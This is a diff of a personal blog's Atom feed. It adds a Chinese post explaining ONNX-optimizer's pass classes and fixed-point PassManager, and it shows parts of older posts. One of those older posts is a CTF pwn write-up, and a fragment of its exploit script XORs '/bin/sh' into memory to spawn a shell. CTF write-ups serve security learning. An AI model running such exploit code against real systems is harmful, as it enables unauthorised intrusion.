@@ -1,4 +1,146 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="cn"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://leakbox258.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://leakbox258.github.io/" rel="alternate" type="text/html" hreflang="cn"/><updated>2025-09-11T15:05:14+00:00</updated><id>https://leakbox258.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">ONNX-opt day0</title><link href="https://leakbox258.github.io/blog/2025/ONNX/" rel="alternate" type="text/html" title="ONNX-opt day0"/><published>2025-09-11T00:00:00+00:00</published><updated>2025-09-11T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2025/ONNX</id><content type="html" xml:base="https://leakbox258.github.io/blog/2025/ONNX/"><![CDATA[<p>今天是人类目前最大的湿件制导导弹命中目标的24(man!)周年</p> <h5 id="onnx-简介">ONNX 简介</h5> <p>ONNX 是一个开放的深度学习框架中立的表示格式，旨在促进不同深度学习工具之间的互操作性。通过 ONNX，开发者可以在不同的深度学习框架之间轻松地转换模型，从而实现更高效的模型部署和推理。<br/><br/> ONNX 和 ONNX-runtime 是两个重要的组成部分，前者是模型计算图和权重的中间表示，后者是一个推理引擎，如下图。<br/><br/></p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ONNX_opt-0-480.webp 480w,/assets/img/ONNX_opt-0-800.webp 800w,/assets/img/ONNX_opt-0-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/ONNX_opt-0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>所以 ONNX 主要用于 AI 模型的交换和部署：</p> <ul> <li>交换：对不同训练框架导出模型文件和权重文件进行转换</li> <li>部署：将模型文件和权重文件交给推理引擎进行运算</li> </ul> <p>上图中的三段式和传统编译器的结构不谋而和，ONNX 虽然并不存在计算图或者算子上的简化，但是其中的一些结构对于模型的抽象使得优化其实不是完全不可能（进入编译器舒适区间了）<br/><br/> 比如，现在已有的 <a href="https://github.com/daquexian/onnx-simplifier?tab=readme-ov-file">ONNX-simplifier</a>（虽然不是很流行），根据其描述是进行计算图上的常量折叠，以及他的third-part依赖<a href="https://github.com/onnx/optimizer">ONNX-optimizer</a><br/><br/> 相较于如何优化这方面，也很重要的方面是如何对 Pass 后的结果进行验证，下面是一些主流的 AI 编译器的测试方法（gen by Gemini）</p> <table> <thead> <tr> <th>框架/标准</th> <th>主要验证策略</th> <th>核心工具/方法</th> </tr> </thead> <tbody> <tr> <td>ONNX</td> <td>结构合法性验证、数值一致性对比</td> <td>onnx.checker、ONNX Runtime（对比不同优化级别/后端）、模型库测试</td> </tr> <tr> <td>MLIR</td> <td>逐层方言规约验证、Pass正确性断言</td> <td>Dialect Verifier、mlir-opt + FileCheck、端到端数值对比</td> </tr> <tr> <td>TVM</td> <td>端到端数值对比、中间层IR对比、底层代码单元测试</td> <td>Relay解释器（对比优化前后）、与NumPy对比、端到端与原始框架对比</td> </tr> <tr> <td>Triton</td> <td>与参考实现的数值一致性对比、梯度检查</td> <td>与PyTorch Eager实现的输出对比、torch.autograd.gradcheck进行梯度验证</td> </tr> </tbody> </table> <p>相比之下，ONNX 有一些优势，提供了足够的<code class="language-plaintext highlighter-rouge">语法与结构规约验证(Syntactic and Structural Verification)</code>的 Python API，不必一定要进行<code class="language-plaintext highlighter-rouge">数值一致性对比 (Numerical Consistency Check)</code>, 虽然后者可以通过 ONNX Runtime 来实现<br/><br/> 不过<code class="language-plaintext highlighter-rouge">数值一致性对比</code>还是很有必要的，但是对规模比较大的测例而言，算力也是一个问题<br/><br/> ONNX 的另一个优点在于，它不像是 TVM 进行端到端的训练和部署，所以研究性的工作可能会比轻松<br/><br/></p> <h5 id="onnx-环境配置">ONNX 环境配置</h5> <p>由于是进行研究，所以需要一套源代码 <a href="https://github.com/onnx/onnx/releases/tag/v1.19.0">ONNX 1.19.0 release</a> <br/><br/> 再次之前，墙裂建议使用<code class="language-plaintext highlighter-rouge">conda</code>等工具进行环境隔离<br/><br/> 在编译之前，需要安装<code class="language-plaintext highlighter-rouge">protobuf</code>，以下是源代码编译安装</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  git clone https://github.com/protocolbuffers/protobuf.git
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="cn"><generator uri="https://jekyllrb.com/" version="4.4.1">Jekyll</generator><link href="https://leakbox258.github.io/feed.xml" rel="self" type="application/atom+xml"/><link href="https://leakbox258.github.io/" rel="alternate" type="text/html" hreflang="cn"/><updated>2025-09-12T14:18:50+00:00</updated><id>https://leakbox258.github.io/feed.xml</id><title type="html">blank</title><subtitle>A simple, whitespace theme for academics. Based on [*folio](https://github.com/bogoli/-folio) design. </subtitle><entry><title type="html">ONNX-opt 1</title><link href="https://leakbox258.github.io/blog/2025/ONNX-1/" rel="alternate" type="text/html" title="ONNX-opt 1"/><published>2025-09-12T00:00:00+00:00</published><updated>2025-09-12T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2025/ONNX-1</id><content type="html" xml:base="https://leakbox258.github.io/blog/2025/ONNX-1/"><![CDATA[<h5 id="onnx-optimizer">ONNX-optimizer</h5> <p>ONNX-opt 虽然是一个很古老的 AI 优化器，但可能也有一些参考价值 ONNX-opt 使用 Pass 对模型进行优化，参见源代码<code class="language-plaintext highlighter-rouge">onnx-optmizer/pass.h</code>中的 transform pass 的基类</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">Pass</span> <span class="p">{</span>
+  <span class="n">PassType</span> <span class="n">pass_type</span><span class="p">;</span>
+  <span class="n">PassEfficiency</span> <span class="n">pass_efficiency</span><span class="p">;</span>
+  <span class="n">PassOptimizationType</span> <span class="n">pass_optimization_type</span><span class="p">;</span>
+    <span class="p">...</span>
+<span class="p">};</span>
+
+<span class="c1">// Enum that represents the type of optimization it is.</span>
+<span class="k">enum</span> <span class="n">PassType</span> <span class="p">{</span>
+  <span class="c1">// Class of optimizations that fuses operations.</span>
+  <span class="n">Fuse</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="c1">// Class of optimizations that removes useless operations.</span>
+  <span class="n">Nop</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+  <span class="c1">// Class of optimizations that includes some form of separation.</span>
+  <span class="n">Separate</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span>
+  <span class="c1">// Immutable pass, also sometimes referred to as an analysis pass.</span>
+  <span class="n">Immutable</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span>
+  <span class="c1">// Class of optimizations that replaces nodes with other.</span>
+  <span class="n">Replace</span> <span class="o">=</span> <span class="mi">4</span><span class="p">,</span>
+  <span class="c1">// Other type of pass.</span>
+  <span class="n">Other</span> <span class="o">=</span> <span class="mi">5</span>
+<span class="p">};</span>
+<span class="k">enum</span> <span class="n">PassOptimizationType</span> <span class="p">{</span>
+  <span class="c1">// Is not optimizing anything. Most likely will be used in an immutable pass.</span>
+  <span class="n">None</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="c1">// Optimizes for compute.</span>
+  <span class="n">Compute</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+  <span class="c1">// Optimizes for memory.</span>
+  <span class="n">Memory</span> <span class="o">=</span> <span class="mi">2</span><span class="p">,</span>
+  <span class="c1">// Optimizes for both compute and memory.</span>
+  <span class="n">ComputeMemory</span> <span class="o">=</span> <span class="mi">3</span><span class="p">,</span>
+  <span class="c1">// Optimizes for stability (e.g. log-sum-exp trick).</span>
+  <span class="n">Stability</span> <span class="o">=</span> <span class="mi">4</span>
+<span class="p">};</span>
+<span class="k">enum</span> <span class="n">PassEfficiency</span> <span class="p">{</span>
+  <span class="c1">// A partially efficient optimization pass cannot guarantee that running two</span>
+  <span class="c1">// consecutive passes</span>
+  <span class="c1">// will return the same result as running a single pass.</span>
+  <span class="n">Partial</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+  <span class="c1">// A completely efficient optimization guarantees that running two consecutive</span>
+  <span class="c1">// passes is equivalent</span>
+  <span class="c1">// to running a single pass.</span>
+  <span class="n">Complete</span> <span class="o">=</span> <span class="mi">1</span>
+<span class="p">};</span>
+</code></pre></div></div> <p>transform pass 基于操作类型划分有一下几类</p> <ul> <li><code class="language-plaintext highlighter-rouge">Fuse</code>: 进行算子合并</li> <li><code class="language-plaintext highlighter-rouge">Nop</code>: 进行冗余消除</li> <li><code class="language-plaintext highlighter-rouge">Separate</code>：进行算子拆分</li> <li><code class="language-plaintext highlighter-rouge">Immutable</code>: 前后模型不变的pass，有时指代 analysis pass</li> <li><code class="language-plaintext highlighter-rouge">Replace</code>: 对计算图节点进行替换</li> <li><code class="language-plaintext highlighter-rouge">Other</code>: 其他 基于pass的效果划分有一下几类</li> <li><code class="language-plaintext highlighter-rouge">None</code>: 无</li> <li><code class="language-plaintext highlighter-rouge">Compute</code>: 改善计算</li> <li><code class="language-plaintext highlighter-rouge">Memory</code>: 改善访存</li> <li><code class="language-plaintext highlighter-rouge">ComputeMemory</code>: …</li> <li><code class="language-plaintext highlighter-rouge">Stability</code>: 提高稳定性 最后，一个pass的效果可能是稳定的，也可能是不稳定的<br/><br/> 同样，还有analysis pass，定义相对简单, 依赖于上面的<code class="language-plaintext highlighter-rouge">Immutable</code> pass，一个 analysis pass 通过 <code class="language-plaintext highlighter-rouge">runPass</code> 的返回值获取分析结果， ```c++ class Pass { … virtual std::shared_ptr<PostPassAnalysis> runPass(Graph &amp;graph) = 0; ... }</PostPassAnalysis></li> </ul> <p>// Base struct representing result of a pass. struct PostPassAnalysis { virtual ~PostPassAnalysis() = default; };</p> <p>// Enum that represents the return type of the analysis. enum PassAnalysisType { // An empty analysis is returned. Most likely will return PostPassAnalysis. Empty = 0, // A count based analysis is returned. Most likely of type // CountBasedPassAnalysis CountBased = 1 };</p> <p>// Pass Analysis done after a predicate based pass. struct CountBasedPassAnalysis : PostPassAnalysis { Pass *pass; … bool graphChanged(); bool numSucceededTransforms();</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>...
+</code></pre></div></div> <p>// Whether or not a repeated application of the pass might be useful. bool fixedPointOptimizationNeeded() { return this-&gt;graphChanged() &amp;&amp; pass-&gt;getPassEfficiency() == PassEfficiency::Partial; } … };</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>`CountBasedPassAnalysis`应该是目前ONNX-opt唯一的`PostPassAnalysis`的继承示例（empty无需继承）&lt;br&gt;&lt;br&gt;
+`Pass *pass` 是 `runPass` 中传入的 `this` 指针&lt;br&gt;&lt;br&gt;
+
+##### PassManager
+ONNX-opt 有两类Manager可用，对应上一节提到的两种`Optimizer`, 一种是`GeneralPassManager`，另一种是`FixedPointPassManager`
+```c++
+class PassManager {
+    ...
+};
+
+class GeneralPassManager : public PassManager {
+ public:
+  GeneralPassManager() {}
+  ~GeneralPassManager() override;
+
+  void add(std::shared_ptr&lt;Pass&gt; pass) override;
+  std::shared_ptr&lt;PassManagerAnalysis&gt; run(Graph&amp; graph) override;
+
+ protected:
+  std::vector&lt;std::shared_ptr&lt;Pass&gt;&gt; passes;
+};
+
+class FixedPointPassManager : public GeneralPassManager {
+  std::shared_ptr&lt;PassManagerAnalysis&gt; run(Graph&amp; graph) override;
+};
+</code></pre></div></div> <p>没有任何理解上的难度，下面是如何实现这么一个 fix point：</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">PassManagerAnalysis</span><span class="o">&gt;</span> <span class="n">FixedPointPassManager</span><span class="o">::</span><span class="n">run</span><span class="p">(</span><span class="n">Graph</span><span class="o">&amp;</span> <span class="n">graph</span><span class="p">)</span> <span class="p">{</span>
+  <span class="kt">bool</span> <span class="n">fixed_point_optimization_done</span><span class="p">;</span>
+
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="n">fixed_point_optimization_done</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
+    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">Pass</span><span class="o">&gt;&amp;</span> <span class="n">pass</span> <span class="o">:</span> <span class="k">this</span><span class="o">-&gt;</span><span class="n">passes</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">PostPassAnalysis</span><span class="o">&gt;</span> <span class="n">analysis</span> <span class="o">=</span> <span class="n">pass</span><span class="o">-&gt;</span><span class="n">runPass</span><span class="p">(</span><span class="n">graph</span><span class="p">);</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">pass</span><span class="o">-&gt;</span><span class="n">getPassAnalysisType</span><span class="p">()</span> <span class="o">==</span> <span class="n">PassAnalysisType</span><span class="o">::</span><span class="n">Empty</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">continue</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">CountBasedPassAnalysis</span><span class="o">&gt;</span> <span class="n">count_analysis</span> <span class="o">=</span>
+          <span class="n">std</span><span class="o">::</span><span class="n">static_pointer_cast</span><span class="o">&lt;</span><span class="n">CountBasedPassAnalysis</span><span class="o">&gt;</span><span class="p">(</span><span class="n">analysis</span><span class="p">);</span>
+
+      <span class="k">while</span> <span class="p">(</span><span class="n">count_analysis</span><span class="o">-&gt;</span><span class="n">fixedPointOptimizationNeeded</span><span class="p">())</span> <span class="p">{</span>
+        <span class="n">count_analysis</span> <span class="o">=</span> <span class="n">std</span><span class="o">::</span><span class="n">static_pointer_cast</span><span class="o">&lt;</span><span class="n">CountBasedPassAnalysis</span><span class="o">&gt;</span><span class="p">(</span>
+            <span class="n">pass</span><span class="o">-&gt;</span><span class="n">runPass</span><span class="p">(</span><span class="n">graph</span><span class="p">));</span>
+        <span class="n">fixed_point_optimization_done</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">fixed_point_optimization_done</span><span class="p">);</span>
+
+  <span class="k">return</span> <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">PassManagerAnalysis</span><span class="o">&gt;</span><span class="p">(</span><span class="k">new</span> <span class="nf">EmptyPassManagerAnalysis</span><span class="p">());</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>也是非常简单，当<code class="language-plaintext highlighter-rouge">runPass</code>返回的 analysis 结果不为空时，调用<code class="language-plaintext highlighter-rouge">fixedPointOptimizationNeeded</code>检查是否可以进行不动点迭代，然后一直迭代到没有不同点为止<br/><br/></p> <h5 id="两类-transform-pass">两类 transform pass</h5> <h6 id="predicatebasedpass">PredicateBasedPass</h6> <p>基于计算图上匹配字图的 transform pass，有两个关键方法<code class="language-plaintext highlighter-rouge">patternMatchPredicate</code>和<code class="language-plaintext highlighter-rouge">runTransform</code>, 在实际进行pass之前，先使用前者匹配字图, 如果匹配到则调用后者进行转换，这个流程在 <code class="language-plaintext highlighter-rouge">runPass -&gt; _runPassInternal</code> 执行。ONNX-opt 的大部分的 pass 都是这种类型</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">PredicateBasedPass</span> <span class="o">:</span> <span class="k">public</span> <span class="n">Pass</span> <span class="p">{</span>
+ <span class="nl">public:</span>
+  <span class="k">explicit</span> <span class="n">PredicateBasedPass</span><span class="p">(</span><span class="n">PassType</span> <span class="n">pass_type</span><span class="p">,</span>
+                              <span class="n">PassEfficiency</span> <span class="n">pass_efficiency</span><span class="p">,</span>
+                              <span class="n">PassOptimizationType</span> <span class="n">pass_optimization_type</span><span class="p">)</span>
+      <span class="o">:</span> <span class="n">Pass</span><span class="p">(</span><span class="n">pass_type</span><span class="p">,</span> <span class="n">pass_efficiency</span><span class="p">,</span> <span class="n">pass_optimization_type</span><span class="p">)</span> <span class="p">{}</span>
+  <span class="o">~</span><span class="n">PredicateBasedPass</span><span class="p">()</span> <span class="k">override</span><span class="p">;</span>
+
+  <span class="k">virtual</span> <span class="kt">bool</span> <span class="n">patternMatchPredicate</span><span class="p">(</span><span class="n">Node</span> <span class="o">*</span><span class="n">node</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="k">virtual</span> <span class="kt">bool</span> <span class="n">runTransform</span><span class="p">(</span><span class="n">Node</span> <span class="o">*</span><span class="n">node</span><span class="p">,</span> <span class="n">Graph</span> <span class="o">&amp;</span><span class="n">graph</span><span class="p">,</span>
+                            <span class="n">NodeDestroyType</span> <span class="o">&amp;</span><span class="n">destroy_current</span><span class="p">)</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+  <span class="n">std</span><span class="o">::</span><span class="n">shared_ptr</span><span class="o">&lt;</span><span class="n">PostPassAnalysis</span><span class="o">&gt;</span> <span class="n">runPass</span><span class="p">(</span><span class="n">Graph</span> <span class="o">&amp;</span><span class="n">graph</span><span class="p">)</span> <span class="k">override</span><span class="p">;</span>
+  <span class="n">PassAnalysisType</span> <span class="n">getPassAnalysisType</span><span class="p">()</span> <span class="k">const</span> <span class="k">override</span><span class="p">;</span>
+
+  <span class="k">static</span> <span class="kt">int</span> <span class="nf">getOpsetVersion</span><span class="p">(</span><span class="k">const</span> <span class="n">Graph</span> <span class="o">&amp;</span><span class="n">g</span><span class="p">)</span> <span class="p">{</span>
+  <span class="n">Graph</span> <span class="o">&amp;</span><span class="n">mut_g</span> <span class="o">=</span> <span class="k">const_cast</span><span class="o">&lt;</span><span class="n">Graph</span> <span class="o">&amp;&gt;</span><span class="p">(</span><span class="n">g</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="k">const</span> <span class="n">OpSetID</span> <span class="o">&amp;</span><span class="n">opset</span> <span class="o">:</span> <span class="n">mut_g</span><span class="p">.</span><span class="n">opset_versions_mutable</span><span class="p">())</span> <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">opset</span><span class="p">.</span><span class="n">domain</span><span class="p">()</span> <span class="o">==</span> <span class="s">""</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="n">opset</span><span class="p">.</span><span class="n">version</span><span class="p">();</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+
+ <span class="k">private</span><span class="o">:</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">_runPassInternal</span><span class="p">(</span><span class="n">Graph</span> <span class="o">&amp;</span><span class="n">graph</span><span class="p">);</span>
+<span class="p">};</span>
+</code></pre></div></div> <p>这里比较重要的是 <code class="language-plaintext highlighter-rouge">runTransform</code> 是如何修改图的，这个需要之后对 ONNX 的 <code class="language-plaintext highlighter-rouge">IR, Node, Graph</code> 等内容进行分析<br/><br/></p> <h6 id="fullgraphbasedpass">FullGraphBasedPass</h6> <p>在整个图上的优化:</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// The most general pass which allows the user to run a pass given only a graph.</span>
+<span class="k">class</span> <span class="nc">FullGraphBasedPass</span> <span class="o">:</span> <span class="k">public</span> <span class="n">Pass</span> <span class="p">{</span>
+ <span class="nl">public:</span>
+  <span class="k">explicit</span> <span class="n">FullGraphBasedPass</span><span class="p">(</span><span class="n">PassType</span> <span class="n">pass_type</span><span class="p">,</span>
+                              <span class="n">PassEfficiency</span> <span class="n">pass_efficiency</span><span class="p">,</span>
+                              <span class="n">PassOptimizationType</span> <span class="n">pass_optimization_type</span><span class="p">)</span>
+      <span class="o">:</span> <span class="n">Pass</span><span class="p">(</span><span class="n">pass_type</span><span class="p">,</span> <span class="n">pass_efficiency</span><span class="p">,</span> <span class="n">pass_optimization_type</span><span class="p">)</span> <span class="p">{}</span>
+  <span class="o">~</span><span class="n">FullGraphBasedPass</span><span class="p">()</span> <span class="k">override</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div> <p>举个例子，<code class="language-plaintext highlighter-rouge">eliminate_deadend.h</code>, 大致就是在整个计算图上，根据use关系，找到 unreachable node 并删除的优化</p> <div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">EliminateDead</span><span class="p">(</span><span class="n">Graph</span><span class="o">&amp;</span> <span class="n">graph</span><span class="p">)</span> <span class="p">{</span>
+<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">nodes_removed</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+<span class="k">auto</span> <span class="n">nodes</span> <span class="o">=</span> <span class="n">graph</span><span class="p">.</span><span class="n">nodes</span><span class="p">().</span><span class="n">reverse</span><span class="p">();</span>
+<span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="n">it</span> <span class="o">=</span> <span class="n">nodes</span><span class="p">.</span><span class="n">begin</span><span class="p">();</span> <span class="n">it</span> <span class="o">!=</span> <span class="n">nodes</span><span class="p">.</span><span class="n">end</span><span class="p">();</span> <span class="n">it</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">auto</span> <span class="n">node</span> <span class="o">=</span> <span class="o">*</span><span class="n">it</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">node</span><span class="o">-&gt;</span><span class="n">hasUses</span><span class="p">())</span> <span class="p">{</span>
+    <span class="n">nodes_removed</span><span class="o">++</span><span class="p">;</span>
+    <span class="n">it</span><span class="p">.</span><span class="n">destroyCurrent</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+<span class="k">return</span> <span class="n">nodes_removed</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div> <p>可以看到，<code class="language-plaintext highlighter-rouge">nodes</code> 是整个图中节点的拓扑排序<br/><br/></p>]]></content><author><name>久菜合子</name></author><category term="dev"/><category term="nn"/><category term="onnx"/><category term="ai-compiler"/><summary type="html"><![CDATA[ONNX-optimizer ONNX-opt 虽然是一个很古老的 AI 优化器，但可能也有一些参考价值 ONNX-opt 使用 Pass 对模型进行优化，参见源代码onnx-optmizer/pass.h中的 transform pass 的基类 ```c++ class Pass { PassType pass_type; PassEfficiency pass_efficiency; PassOptimizationType pass_optimization_type; … };]]></summary></entry><entry><title type="html">ONNX-opt 0</title><link href="https://leakbox258.github.io/blog/2025/ONNX-0/" rel="alternate" type="text/html" title="ONNX-opt 0"/><published>2025-09-11T00:00:00+00:00</published><updated>2025-09-11T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2025/ONNX-0</id><content type="html" xml:base="https://leakbox258.github.io/blog/2025/ONNX-0/"><![CDATA[<p>今天是人类目前最大的湿件制导导弹命中目标的24(man!)周年</p> <h5 id="onnx-简介">ONNX 简介</h5> <p>ONNX 是一个开放的深度学习框架中立的表示格式，旨在促进不同深度学习工具之间的互操作性。通过 ONNX，开发者可以在不同的深度学习框架之间轻松地转换模型，从而实现更高效的模型部署和推理。<br/><br/> ONNX 和 ONNX-runtime 是两个重要的组成部分，前者是模型计算图和权重的中间表示，后者是一个推理引擎，如下图。<br/><br/></p> <figure> <picture> <source class="responsive-img-srcset" srcset="/assets/img/ONNX_opt-0-480.webp 480w,/assets/img/ONNX_opt-0-800.webp 800w,/assets/img/ONNX_opt-0-1400.webp 1400w," type="image/webp" sizes="95vw"/> <img src="/assets/img/ONNX_opt-0.png" class="img-fluid rounded z-depth-1" width="100%" height="auto" data-zoomable="" loading="lazy" onerror="this.onerror=null; $('.responsive-img-srcset').remove();"/> </picture> </figure> <p>所以 ONNX 主要用于 AI 模型的交换和部署：</p> <ul> <li>交换：对不同训练框架导出模型文件和权重文件进行转换</li> <li>部署：将模型文件和权重文件交给推理引擎进行运算</li> </ul> <p>上图中的三段式和传统编译器的结构不谋而和，ONNX 虽然并不存在计算图或者算子上的简化，但是其中的一些结构对于模型的抽象使得优化其实不是完全不可能（进入编译器舒适区间了）<br/><br/> 比如，现在已有的 <a href="https://github.com/daquexian/onnx-simplifier?tab=readme-ov-file">ONNX-simplifier</a>（虽然不是很流行），根据其描述是进行计算图上的常量折叠，以及他的third-part依赖<a href="https://github.com/onnx/optimizer">ONNX-optimizer</a><br/><br/> 相较于如何优化这方面，也很重要的方面是如何对 Pass 后的结果进行验证，下面是一些主流的 AI 编译器的测试方法（gen by Gemini）</p> <table> <thead> <tr> <th>框架/标准</th> <th>主要验证策略</th> <th>核心工具/方法</th> </tr> </thead> <tbody> <tr> <td>ONNX</td> <td>结构合法性验证、数值一致性对比</td> <td>onnx.checker、ONNX Runtime（对比不同优化级别/后端）、模型库测试</td> </tr> <tr> <td>MLIR</td> <td>逐层方言规约验证、Pass正确性断言</td> <td>Dialect Verifier、mlir-opt + FileCheck、端到端数值对比</td> </tr> <tr> <td>TVM</td> <td>端到端数值对比、中间层IR对比、底层代码单元测试</td> <td>Relay解释器（对比优化前后）、与NumPy对比、端到端与原始框架对比</td> </tr> <tr> <td>Triton</td> <td>与参考实现的数值一致性对比、梯度检查</td> <td>与PyTorch Eager实现的输出对比、torch.autograd.gradcheck进行梯度验证</td> </tr> </tbody> </table> <p>相比之下，ONNX 有一些优势，提供了足够的<code class="language-plaintext highlighter-rouge">语法与结构规约验证(Syntactic and Structural Verification)</code>的 Python API，不必一定要进行<code class="language-plaintext highlighter-rouge">数值一致性对比 (Numerical Consistency Check)</code>, 虽然后者可以通过 ONNX Runtime 来实现<br/><br/> 不过<code class="language-plaintext highlighter-rouge">数值一致性对比</code>还是很有必要的，但是对规模比较大的测例而言，算力也是一个问题<br/><br/> ONNX 的另一个优点在于，它不像是 TVM 进行端到端的训练和部署，所以研究性的工作可能会比轻松<br/><br/></p> <h5 id="onnx-环境配置">ONNX 环境配置</h5> <p>由于是进行研究，所以需要一套源代码 <a href="https://github.com/onnx/onnx/releases/tag/v1.19.0">ONNX 1.19.0 release</a> <br/><br/> 再次之前，墙裂建议使用<code class="language-plaintext highlighter-rouge">conda</code>等工具进行环境隔离<br/><br/> 在编译之前，需要安装<code class="language-plaintext highlighter-rouge">protobuf</code>，以下是源代码编译安装</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  git clone https://github.com/protocolbuffers/protobuf.git
   <span class="nb">cd </span>protobuf
   git checkout v5.29.2
   git submodule update <span class="nt">--init</span> <span class="nt">--recursive</span>
@@ -1923,714 +2065,4 @@ LOAD:0000000000000000 <span class="p">;</span> Needed Library <span class="s1">'
 <span class="c1"># 再把开头处改成'/bin/sh\0'，跳出循环
 </span><span class="nf">xorsend</span><span class="p">(</span><span class="nf">str</span><span class="p">(</span><span class="mi">0</span><span class="p">),</span> <span class="nf">str</span><span class="p">(</span><span class="nf">key</span><span class="p">(</span><span class="sa">b</span><span class="sh">'</span><span class="s">/bin/sh</span><span class="se">\x00</span><span class="sh">'</span><span class="p">,</span> <span class="sa">b</span><span class="sh">'</span><span class="s">sh</span><span class="se">\x00</span><span class="s">dbeef</span><span class="sh">'</span><span class="p">)))</span>
 <span class="n">io</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
-</code></pre></div></div> <h5 id="第二种方法是出题人迪普朋克提示的但没有想到怎么实现puts和system在libc中的偏移有16进制下的五位之多由于无法泄露libc基址异或最多修改三位所以不知道具体怎么写">   第二种方法是出题人迪普朋克提示的，但没有想到怎么实现，<code class="language-plaintext highlighter-rouge">puts</code>和<code class="language-plaintext highlighter-rouge">system()</code>在libc中的偏移有16进制下的五位之多，由于无法泄露libc基址，异或最多修改三位，所以不知道具体怎么写。</h5> <h5 id="补几天之后打通了远程发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样mmap分配的空间的位置不一样把上面exp的地址改一下就可以">   补：几天之后打通了远程，发现是nc远程启动的进程和docker容器内本地启动的进程内存布局不一样，<code class="language-plaintext highlighter-rouge">mmap()</code>分配的空间的位置不一样，把上面exp的地址改一下就可以。</h5>]]></content><author><name>久菜合子</name></author><category term="CTF"/><category term="pwn"/><summary type="html"><![CDATA[参考资料： 实例文件为boss题的attachment，见github https://zhuanlan.zhihu.com/p/37572651 https://ctf-wiki.org/executable/elf/structure/basic-info/ https://deepunk.icu/dl%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E6%B1%87%E6%80%BB/ https://www.soinside.com/question/AENBEApAgMMbfzPviVeoBc]]></summary></entry><entry><title type="html">CNSS2024 pwn 方向wp</title><link href="https://leakbox258.github.io/blog/2024/CNSS2024/" rel="alternate" type="text/html" title="CNSS2024 pwn 方向wp"/><published>2024-09-21T00:00:00+00:00</published><updated>2024-09-21T00:00:00+00:00</updated><id>https://leakbox258.github.io/blog/2024/CNSS2024</id><content type="html" xml:base="https://leakbox258.github.io/blog/2024/CNSS2024/"><![CDATA[<h5 id="前排提示1一些题目没exp2由于题目不是一次上完的所以顺序上可能不完全与当时一致3附件在github仓库里有"><strong><em>前排提示：1.一些题目没exp<br/>       